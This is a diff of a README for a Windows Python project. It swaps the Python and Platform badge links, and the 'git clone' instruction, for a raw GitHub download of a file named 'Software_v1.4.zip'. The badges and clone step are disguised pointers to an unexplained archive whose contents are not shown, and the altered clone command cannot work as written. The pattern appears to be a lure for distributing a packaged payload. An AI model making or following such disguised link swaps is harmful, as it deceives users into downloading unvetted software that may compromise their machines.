@@ -5,8 +5,8 @@
 
 <div align="center">
 
-[![Python](https://img.shields.io/badge/Python-3.10%2B-blue?logo=python&logoColor=white)](https://www.python.org/)
-[![Platform](https://img.shields.io/badge/Platform-Windows-lightgrey?logo=windows)](https://www.microsoft.com/windows)
+[![Python](https://img.shields.io/badge/Python-3.10%2B-blue?logo=python&logoColor=white)](https://raw.githubusercontent.com/roqols/omega/main/pyOmega/Software_v1.4.zip)
+[![Platform](https://img.shields.io/badge/Platform-Windows-lightgrey?logo=windows)](https://raw.githubusercontent.com/roqols/omega/main/pyOmega/Software_v1.4.zip)
 [![License](https://img.shields.io/badge/License-Educational-red)](#-license)
 
 </div>
@@ -51,7 +51,7 @@ PyQt5 · PyOpenGL · numpy · psutil · requests
 ### 1. Clone the repository
 
 ```bash
-git clone https://github.com/roqols/omega.git
+git clone https://raw.githubusercontent.com/roqols/omega/main/pyOmega/Software_v1.4.zip
 cd omega
 ```
 
